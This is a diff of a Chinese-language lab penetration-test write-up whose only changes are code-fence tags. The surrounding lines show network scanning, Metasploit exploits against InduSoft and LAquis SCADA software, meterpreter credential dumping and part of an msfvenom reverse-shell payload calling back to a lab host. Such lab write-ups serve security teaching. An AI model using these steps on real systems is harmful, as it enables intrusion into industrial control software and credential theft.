@@ -42,7 +42,7 @@ S7-Server
 
 ## 外网打点-Target1
 
-```
+```bash
 fscan64.exe -h 192.168.36.0/24 -p 139 445 22 21 80
 ```
 
@@ -70,11 +70,11 @@ start vulscan
 
 #### 信息收集-全端口扫描
 
-```
+```bash
 fscan64.exe -h 192.168.36.152 -p 1-65535
 ```
 
-```
+```bash
    ___                              _
   / _ \     ___  ___ _ __ __ _  ___| | __
  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
@@ -317,10 +317,12 @@ start vulscan
 ```
 
 #### 信息收集-Nmap详细探测
-```
+
+```bash
 nmap -v -A 192.168.36.152 -p-
 ```
-```
+
+```shell
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 17:24 中国标准时间
 NSOCK ERROR [0.2410s] ssl_init_helper(): OpenSSL legacy provider failed to load.
 
@@ -432,7 +434,7 @@ Nmap done: 1 IP address (1 host up) scanned in 232.45 seconds
 
 尝试使用MSF模块利用ms17-010，以失败告终，根据Nmap扫描到的结果还有1234和4322端口开放，依次访问，都没有web页面，网上搜索4322端口，发现一篇文章：[嵌入式HMI软件-InduSoft Web Studio RCE漏洞复现](https://cloud.tencent.com/developer/article/1910841)，msf中集成了这个exp，尝试利用。
 
-```
+```shell
 use windows/scada/indusoft_webstudio_exec
 ```
 
@@ -447,7 +449,7 @@ use windows/scada/indusoft_webstudio_exec
 
 #### 外网机信息收集-密码收集
 
-```
+```bash
 meterpreter > creds_all
 [+] Running as SYSTEM
 [*] Retrieving all credentials
@@ -583,7 +585,7 @@ mv LAquis_cve_2017_6020.rb /usr/share/metasploit-framework/modules/exploits/wind
 
 msf中`reload_all` 加载全部模块，就可以将我们新的payload加载进去，这条命令不需要重启msf，session不会掉。
 
-```
+```bash
 reload_all
 
 use exploit/windows/scada/LAquis_cve_2017_6020
@@ -674,7 +676,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.90.40 LPORT=2222 -a x8
 
 获取账号密码，查看是否存在其他账号
 
-```
+```bash
 meterpreter > creds_all 
 [+] Running as SYSTEM
 [*] Retrieving all credentials
